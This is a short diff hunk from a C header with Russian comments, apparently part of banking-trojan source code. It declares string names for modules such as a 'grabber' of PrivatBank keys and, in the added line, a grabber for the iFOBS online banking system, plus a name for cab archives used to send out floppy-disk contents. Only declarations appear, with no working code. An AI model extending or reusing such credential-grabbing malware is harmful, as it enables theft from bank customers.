@@ -67,7 +67,7 @@ extern CSSTR EStrConfigHPFileName[]; // Имя файла хранения конфига повышенного п
 
 //Имя систем граберов
 extern CSSTR EStrSystemPrivat[]; // Грабер ключей приватбанка
-
+extern CSSTR EStrSystemIfobsOnline[]; // Грабер системы Ifobs онлайн
 
 // Имя кабов
 extern CSSTR EStrCabNameDisketa[]; // Имя каба для отправки флопидисков
